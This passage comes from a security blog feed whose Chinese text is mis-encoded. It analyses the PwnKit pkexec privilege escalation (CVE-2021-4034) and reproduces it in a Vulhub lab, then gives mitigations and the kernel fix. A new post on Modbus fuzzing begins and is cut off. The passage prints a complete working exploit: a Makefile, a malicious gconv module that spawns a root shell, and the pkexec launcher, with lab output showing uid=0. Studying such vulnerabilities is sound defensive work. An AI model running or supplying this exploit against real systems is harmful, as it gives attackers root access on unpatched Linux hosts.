çš„ä½œç”¨</strong></p><ul><li><code>GCONV_PATH</code>ç¯å¢ƒå˜é‡ç”¨äºæŒ‡å®š<code>gconv</code>åº“æœç´¢å­—ç¬¦é›†è½¬æ¢æ¨¡å—çš„è·¯å¾„ã€‚å½“<code>gconv</code>éœ€è¦åŠ è½½æŸä¸ªå­—ç¬¦é›†è½¬æ¢æ¨¡å—æ—¶ï¼Œå®ƒä¼šæŒ‰ç…§<code>GCONV_PATH</code>ä¸­æŒ‡å®šçš„è·¯å¾„é¡ºåºæœç´¢</li></ul><p><code>gconv-modules</code>æ–‡ä»¶çš„æ¯ä¸€è¡Œå®šä¹‰ä¸€ä¸ªå­—ç¬¦é›†è½¬æ¢æ¨¡å—ï¼Œå…¶æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">module</span> &lt;æºå­—ç¬¦é›†&gt; // &lt;ç›®æ ‡å­—ç¬¦é›†&gt; // &lt;æ¨¡å—åç§°&gt; &lt;ä¼˜å…ˆçº§&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>æºå­—ç¬¦é›†</code>ï¼šéœ€è¦è½¬æ¢çš„å­—ç¬¦é›†ã€‚</li><li><code>ç›®æ ‡å­—ç¬¦é›†</code>ï¼šè½¬æ¢åçš„å­—ç¬¦é›†ã€‚</li><li><code>æ¨¡å—åç§°</code>ï¼šå®ç°è½¬æ¢çš„æ¨¡å—åç§°ï¼ˆä¸åŒ…å«<code>.so</code>åç¼€ï¼‰ã€‚</li><li><code>ä¼˜å…ˆçº§</code>ï¼šæ¨¡å—çš„ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li></ul></blockquote><p>ç»ˆäºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>GCONV_PATH</code>è¯¥ç¯å¢ƒå˜é‡è¿›è¡Œæ§åˆ¶æµåŠ«æŒ</p><h3 id="æ§åˆ¶æµåŠ«æŒ"><a href="#æ§åˆ¶æµåŠ«æŒ" class="headerlink" title="æ§åˆ¶æµåŠ«æŒ"></a>æ§åˆ¶æµåŠ«æŒ</h3><p>æ­¤æ—¶å°±è¦å¯»æ‰¾å¯ä»¥è§¦å‘<code>g_printerr</code>çš„ä½ç½®ï¼Œåœ¨639è¡Œè¢«è¶Šç•Œå†™ä»¥åŠ702è¡Œ<code>clearenv()</code>å‰è¿›è¡Œå¯»æ‰¾</p><ul><li>validate_environment_variable()å‡½æ•°ï¼Œè¿™é‡Œè®¾ç½®ä¸€ä¸ªä¸åœ¨<code>/etc/shells</code>ä¸­çš„å˜é‡å³å¯è§¦å‘ã€‚ä¾‹å¦‚<code>SHELL=c0r3dump</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 665</span><br><span class="hljs-comment">/* To qualify for the paranoia goldstar - we validate the value of each</span><br><span class="hljs-comment">       * environment variable passed through - this is to attempt to avoid</span><br><span class="hljs-comment">       * exploits in (potentially broken) programs launched via pkexec(1).</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">if</span> (!validate_environment_variable (key, value))<br>        <span class="hljs-keyword">goto</span> out;<br><br>      g_ptr_array_add (saved_env, g_strdup (key));<br>      g_ptr_array_add (saved_env, g_strdup (value));<br>    &#125;<br><br><span class="hljs-type">static</span> gboolean<br><span class="hljs-title function_">validate_environment_variable</span> <span class="hljs-params">(<span class="hljs-type">const</span> gchar *key,</span><br><span class="hljs-params">                               <span class="hljs-type">const</span> gchar *value)</span><br>&#123;<br>  gboolean ret;<br><br>  <span class="hljs-comment">/* Generally we bail if any environment variable value contains</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   *   - &#x27;/&#x27; characters</span><br><span class="hljs-comment">   *   - &#x27;%&#x27; characters</span><br><span class="hljs-comment">   *   - &#x27;..&#x27; substrings</span><br><span class="hljs-comment">   */</span><br><br>  g_return_val_if_fail (key != <span class="hljs-literal">NULL</span>, FALSE);<br>  g_return_val_if_fail (value != <span class="hljs-literal">NULL</span>, FALSE);<br><br>  ret = FALSE;<br><br>  <span class="hljs-comment">/* special case $SHELL */</span><br>  <span class="hljs-keyword">if</span> (g_strcmp0 (key, <span class="hljs-string">&quot;SHELL&quot;</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* check if it&#x27;s in /etc/shells */</span><br>      <span class="hljs-keyword">if</span> (!is_valid_shell (value))<br>        &#123;<br>          log_message (LOG_CRIT, TRUE,<br>                       <span class="hljs-string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);<br>          g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br>                      <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>          <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((g_strcmp0 (key, <span class="hljs-string">&quot;XAUTHORITY&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;/&quot;</span>) != <span class="hljs-literal">NULL</span>) ||<br>           <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;%&quot;</span>) != <span class="hljs-literal">NULL</span> ||<br>           <span class="hljs-built_in">strstr</span> (value, <span class="hljs-string">&quot;..&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      log_message (LOG_CRIT, TRUE,<br>                   <span class="hljs-string">&quot;The value for environment variable %s contains suscipious content&quot;</span>,<br>                   key);<br>      g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br>                  <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>      <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>  ret = TRUE;<br><br> out:<br>  <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PoCåˆ†æ"><a href="#PoCåˆ†æ" class="headerlink" title="PoCåˆ†æ"></a>PoCåˆ†æ</h2><ul><li><a href="https://github.com/PwnFunction/CVE-2021-4034/tree/main">PwnFunction&#x2F;CVE-2021-4034: Proof of concept for pwnkit vulnerability</a></li></ul><p>Makefileè¿‡ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç§»é™¤ç›®å½•ï¼Œæ–‡ä»¶</span><br><span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span> pwn pwnkit<br><br><span class="hljs-comment"># åˆ›å»ºæ–‡ä»¶å¤¹GCONV_PATH,ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶pwn</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span><br><span class="hljs-built_in">touch</span> GCONV_PATH=.\/pwn<br><span class="hljs-built_in">chmod</span> +x GCONV_PATH=.\/pwn<br><br><span class="hljs-comment"># åˆ›å»ºpwnç›®å½•ï¼Œä»¥åŠgconvçš„é…ç½®æ–‡ä»¶gconv-modules</span><br><span class="hljs-built_in">mkdir</span> pwn<br><br><span class="hljs-comment"># å®šä¹‰è½¬æ¢å­—ç¬¦é›†BRUHä»¥åŠè½¬æ¢æ¨¡å—åç§°conversion-mod</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;module  UTF-8//    BRUH//    conversion-mod   1&#x27;</span> &gt; pwn/gconv-modules<br><span class="hljs-comment"># ç”Ÿæˆå…±äº«åº“</span><br>gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c<br>gcc -o pwnkit pwnkit.c<br></code></pre></td></tr></table></figure><p>Conversion-mod.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// conversion-mod.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> \_GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;gconv.h&gt;</span></span><br><br><span class="hljs-comment">// gconvæ¨¡å—åˆå§‹åŒ–å‡½æ•°ï¼Œæ¨¡å—è¢«åŠ è½½æ—¶ï¼Œgconv*initå‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">/* Get back uid &amp; gid \_/</span><br><span class="hljs-comment">setuid(0);</span><br><span class="hljs-comment">setgid(0);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    char *args[] = &#123;&quot;sh&quot;, NULL&#125;;</span><br><span class="hljs-comment">    char *envp[] = &#123;&quot;PATH=/bin:/usr/bin:/sbin&quot;, NULL&#125;;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">// å¯åŠ¨ä¸€ä¸ªshell</span><br><span class="hljs-comment">execvpe(&quot;/bin/sh&quot;, args, envp);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    return(__GCONV_OK);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">int gconv()&#123; return(\_\_GCONV_OK); &#125;</span><br></code></pre></td></tr></table></figure><p>Pwnkit.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// pwnkit.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> \*argv[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>    <span class="hljs-type">char</span> *envp[] = &#123;<br>        <span class="hljs-string">&quot;pwn&quot;</span>,              <span class="hljs-comment">// argv[1] = pwn</span><br>        <span class="hljs-string">&quot;SHELL=c0r3dump&quot;</span>,    <span class="hljs-comment">// trigger g_printerr</span><br>        <span class="hljs-string">&quot;PATH=GCONV_PATH=.&quot;</span>,  <span class="hljs-comment">// find GCONV_PATH=./pwn set envp[0]: GCONV_PATH=./pwn</span><br>        <span class="hljs-string">&quot;CHARSET=BRUH&quot;</span>,     <span class="hljs-comment">// trigger conversion-mod.so &gt;&gt; gconv_init</span><br>        <span class="hljs-literal">NULL</span><br>    &#125;;<br><br>    execve(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, argv, envp);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä½¿ç”¨<code>Vulhub</code>ç¼“è§£è¿›è¡Œå¤ç°</p><blockquote><p>è¯´æ˜: Linuxå†…æ ¸åœ¨è¿™ä¸ª<a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">commit</a>ä¸­ä¿®å¤äº†<a href="https://lwn.net/Articles/882799/"><code>argc==0</code>çš„Bug</a>ï¼Œè€ŒDockerç¯å¢ƒä¼šä½¿ç”¨å®¿ä¸»æœºçš„å†…æ ¸ï¼Œæ‰€ä»¥Vulhubé‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯åœ¨Dockerå®¹å™¨ä¸­è¿è¡ŒQemuè™šæ‹Ÿæœºï¼Œå¹¶åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œåˆé€‚ç‰ˆæœ¬çš„Ubuntuæ“ä½œç³»ç»Ÿã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ <span class="hljs-built_in">ls</span><br>1.png  2.png  docker-compose.yml  README.md  README.zh-cn.md<br>c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ docker compose up -d<br>WARN[0000] /home/c0r3dump/vulhub/polkit/CVE-2021-4034/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion<br>[+] Running 7/7<br> âœ” cmd Pulled                                                            133.0s<br>   âœ” 846c0b181fff Pull complete                                           12.8s<br>   âœ” adcb4fd2c82e Pull complete                                          105.5s<br>   âœ” 4dd8f98a0d15 Pull complete                                          105.6s<br>   âœ” 6c7e72ba8d49 Pull complete                                          126.2s<br>   âœ” 7229d6174d2e Pull complete                                          126.2s<br>   âœ” 1df21826fdcb Pull complete                                          128.7s<br>[+] Running 2/2<br> âœ” Network cve-2021-4034_default  Creat...                                 0.1s<br> âœ” Container cve-2021-4034-cmd-1  Start...                                 0.8s<br>c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ docker ps<br>CONTAINER ID   IMAGE                                                               COMMAND                  CREATED          STATUS          PORTS                                       NAMES<br>e1ada6b7a82f   vulhub/polkit:0.105                                                 <span class="hljs-string">&quot;/bin/sh -c &#x27;qemu-syâ€¦&quot;</span>   44 seconds ago   Up 43 seconds   0.0.0.0:2222-&gt;2222/tcp, :::2222-&gt;2222/tcp   cve-2021-4034-cmd-1<br><br></code></pre></td></tr></table></figure><p>sshè¿œç¨‹ç™»å½•ï¼ˆubuntu&#x2F;vulhubï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">c0r3dump@Ubuntu24:~/vulhub/polkit/CVE-2021-4034$ ssh ubuntu@127.0.0.1 -p2222<br>The authenticity of host <span class="hljs-string">&#x27;[127.0.0.1]:2222 ([127.0.0.1]:2222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:iOnReYJVC0B9nwxtURJX7qsenarMwoQd5wD4Nxq2ULg.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[127.0.0.1]:2222<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">ubuntu@127.0.0.1&#x27;</span>s password:<br>Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Wed Feb 19 21:10:50 UTC 2025<br><br>  System load:           1.82<br>  Usage of /:            6.3% of 21.35GB<br>  Memory usage:          12%<br>  Swap usage:            0%<br>  Processes:             138<br>  Users logged <span class="hljs-keyword">in</span>:       0<br>  IPv4 address <span class="hljs-keyword">for</span> ens3: 10.0.2.15<br>  IPv6 address <span class="hljs-keyword">for</span> ens3: fec0::5054:ff:fe12:3456<br><br>0 updates can be installed immediately.<br>0 of these updates are security updates.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: <span class="hljs-built_in">sudo</span> apt update<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>ubuntu@ubuntu:~$<br>ubuntu@ubuntu:~$ <span class="hljs-built_in">uname</span> -ra<br>Linux ubuntu 5.4.0-26-generic <span class="hljs-comment">#30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>ubuntu@ubuntu:~$ <span class="hljs-built_in">cat</span> /etc/issue<br>Ubuntu 20.04 LTS \n \l<br><br></code></pre></td></tr></table></figure><p>PoCå¤ç°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~$ git <span class="hljs-built_in">clone</span> https://github.com/PwnFunction/CVE-2021-4034.git<br>Cloning into <span class="hljs-string">&#x27;CVE-2021-4034&#x27;</span>...<br>remote: Enumerating objects: 31, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (31/31), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (26/26), <span class="hljs-keyword">done</span>.<br>remote: Total 31 (delta 15), reused 13 (delta 5), pack-reused 0 (from 0)<br>Unpacking objects: 100% (31/31), 8.25 KiB | 92.00 KiB/s, <span class="hljs-keyword">done</span>.<br>ubuntu@ubuntu:~$ <span class="hljs-built_in">cd</span> CVE-2021-4034/<br>ubuntu@ubuntu:~/CVE-2021-4034$ <span class="hljs-built_in">ls</span><br>Dockerfile  Makefile  README.md  conversion-mod.c  pwnkit.c<br>ubuntu@ubuntu:~/CVE-2021-4034$ make all<br><span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span> pwn pwnkit<br><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&#x27;GCONV_PATH=.&#x27;</span><br><span class="hljs-built_in">touch</span> GCONV_PATH=.\/pwn<br><span class="hljs-built_in">chmod</span> +x GCONV_PATH=.\/pwn<br><span class="hljs-built_in">mkdir</span> pwn<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;module  UTF-8//    BRUH//    conversion-mod   1&#x27;</span> &gt; pwn/gconv-modules<br>gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c<br>gcc -o pwnkit pwnkit.c<br>ubuntu@ubuntu:~/CVE-2021-4034$ ./pwnkit<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="hljs-built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)<br></code></pre></td></tr></table></figure><h2 id="ç¼“è§£"><a href="#ç¼“è§£" class="headerlink" title="ç¼“è§£"></a>ç¼“è§£</h2><p>ä¸´æ—¶ç¼“è§£æªæ–½ï¼Œç§»é™¤SUID-bit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 0755 /usr/bin/pkexec<br></code></pre></td></tr></table></figure><p>ä¿®å¤ä»£ç ï¼ˆlinux kernel ï¼‰</p><ul><li>argvä¸ºç©ºæ—¶ï¼Œå°†<code>argv[0] = &quot;&quot;;</code>é˜²æ­¢è¶Šç•Œè¯»å†™</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// fix</span><br>/_ When argv is empty, add an empty <span class="hljs-title function_">string</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span> as argv[0] to<br>_ ensure confused userspace programs that start processing<br>_ from argv[1] won&#x27;t end up walking envp. See also<br>_ <span class="hljs-title function_">bprm_stack_limits</span><span class="hljs-params">()</span>.<br>\*/<br><span class="hljs-title function_">if</span> <span class="hljs-params">(bprm-&gt;argc == <span class="hljs-number">0</span>)</span> &#123;<br>retval = copy_string_kernel(<span class="hljs-string">&quot;&quot;</span>, bprm);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br>bprm-&gt;argc = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><p><a href="https://github.com/ly4k/PwnKit">ly4k&#x2F;PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation</a></p></li><li><p><a href="https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c">CVE-2021-4034&#x2F;cve-2021-4034-poc.c at main Â· arthepsy&#x2F;CVE-2021-4034</a></p></li><li><p><a href="https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures">Exploiting PwnKit (CVE-2021-4034): Techniques &amp; Defensive Measure...</a></p></li><li><p><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt</a></p></li><li><p><a href="https://github.com/polkit-org/polkit/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">pkexec: local privilege escalation (CVE-2021-4034) Â· polkit-org&#x2F;polkit@a2bf5c9</a></p></li><li><p><a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">exec: Force single empty string when argv is empty Â· torvalds&#x2F;linux@dcd46d8</a></p></li><li><p><a href="https://www.youtube.com/watch?v=eTcVLqKpZJc">(100) Dangerous Code Hidden in Plain Sight for 12 years - YouTube</a></p></li><li><p><a href="https://github.com/vulhub/vulhub/blob/master/polkit/CVE-2021-4034/README.zh-cn.md">vulhub&#x2F;polkit&#x2F;CVE-2021-4034&#x2F;README.zh-cn.md at master Â· vulhub&#x2F;vulhub</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>LPE</tag>
      
      <tag>Linux</tag>
      
      <tag>SUID</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Modbusåè®®æ¨¡ç³Šæµ‹è¯•</title>
    <link href="/2025/01/05/Modbus%E5%8D%8F%E8%AE%AE%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/01/05/Modbus%E5%8D%8F%E8%AE%AE%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="https://zh.wikipedia.org/wiki/Modbus">Modbus - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></li></ul><blockquote><p>Modbus åè®®æ˜¯ä¸€ä¸ª master&#x2F;slave æ¶æ„çš„åè®®ã€‚æœ‰ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ master èŠ‚ç‚¹ï¼Œå…¶ä»–ä½¿ç”¨ Modbus åè®®å‚ä¸é€šä¿¡çš„èŠ‚ç‚¹æ˜¯ slave èŠ‚ç‚¹ã€‚æ¯ä¸€ä¸ª slave è®¾å¤‡éƒ½æœ‰ä¸€ä¸ª å”¯ä¸€çš„åœ°å€ã€‚åœ¨ä¸²è¡Œå’Œ MB+ç½‘ç»œä¸­ï¼Œåªæœ‰è¢«æŒ‡å®šä¸ºä¸»èŠ‚ç‚¹çš„èŠ‚ç‚¹å¯ä»¥å¯åŠ¨ä¸€ä¸ªå‘½ä»¤ï¼ˆåœ¨ä»¥å¤ªç½‘ä¸Šï¼Œä»»ä½•ä¸€ä¸ªè®¾å¤‡éƒ½èƒ½å‘é€ä¸€ä¸ª Modbus å‘½ä»¤ï¼Œä½†æ˜¯é€šå¸¸ä¹Ÿåªæœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹è®¾å¤‡å¯åŠ¨æŒ‡ä»¤ï¼‰ã€‚</p><p>ä¸€ä¸ª ModBus å‘½ä»¤åŒ…å«äº†æ‰“ç®—æ‰§è¡Œçš„è®¾å¤‡çš„ Modbus åœ°å€ã€‚æ‰€æœ‰è®¾å¤‡éƒ½ä¼šæ”¶åˆ°å‘½ä»¤ï¼Œä½†åªæœ‰æŒ‡å®šä½ç½®çš„è®¾å¤‡ä¼šæ‰§è¡ŒåŠå›åº”æŒ‡ä»¤ï¼ˆåœ°å€ 0 ä¾‹å¤–ï¼ŒæŒ‡å®šåœ°å€ 0 çš„æŒ‡ä»¤æ˜¯å¹¿æ’­æŒ‡ä»¤ï¼Œæ‰€æœ‰æ”¶åˆ°æŒ‡ä»¤çš„è®¾å¤‡éƒ½ä¼šæ‰§è¡Œï¼Œä¸è¿‡ä¸å›åº”æŒ‡ä»¤ï¼‰ã€‚æ‰€æœ‰çš„ Modbus å‘½ä»¤åŒ…å«äº†æ£€æŸ¥ç ï¼Œä»¥ç¡®å®šåˆ°è¾¾çš„å‘½ä»¤æ²¡æœ‰è¢«ç ´åã€‚åŸºæœ¬çš„ ModBus 